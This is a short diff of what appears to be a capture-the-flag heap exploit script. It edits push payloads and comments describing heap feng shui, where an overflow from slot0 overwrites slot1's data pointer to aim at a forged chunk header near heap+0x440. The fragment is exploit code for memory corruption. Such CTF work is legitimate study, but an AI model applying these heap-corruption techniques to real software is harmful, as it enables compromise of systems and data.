@@ -87,23 +87,23 @@ c(0)
 comp(0)
 
 # size:1, cap:0*2=0
-pu(0, '\xff')
+pu(0, 'a')
 
-# We need some fengsui to make this layout
+# We need some fengsui to make slot0->data this layout
 # heap + 0x330: 0x0000000000000000      0x0000000000000021
 # heap + 0x340: 0x0000xxxxxxxxxxxx      0x0000xxxxxxxxxxxx <-- this is slot0->data with size=4
 # heap + 0x350: 0x0000xxxxxxxxxxxx      0x0000xxxxxxxxxxxx <-- next push will overwrite slot1->data
 # heap + 0x360: 0x0000yyyyyyyyyyyy      0x0000000000000001 <-- this is slot1 chunk with size=1
 c(1)
-pu(1, 'bbbbbbbb')
-pu(0, '\xff')
-pu(0, '\xff')
-pu(0, '\xff')
+pu(1, 'a')
+pu(0, 'a')
+pu(0, 'a')
+pu(0, 'a')
 
 # This will overwrite slot1->data[0] to (heap + 0x440) = slot2 + 0x10
 pu(0, p64(heap+0x440))
 
-# make slot2 this form
+# make slot2 this layout
 # heap + 0x420: 0x0000000000000000      0x0000000000000031
 # heap + 0x430: 0x0000xxxxxxxxxxxx      0x0000000000000021 <-- size = 0x21 (as fake chunk header)
 # heap + 0x440: 0x0000000000000040      0x00007fxxxxxxxxxx <-- (slot1->data[0]) points here !
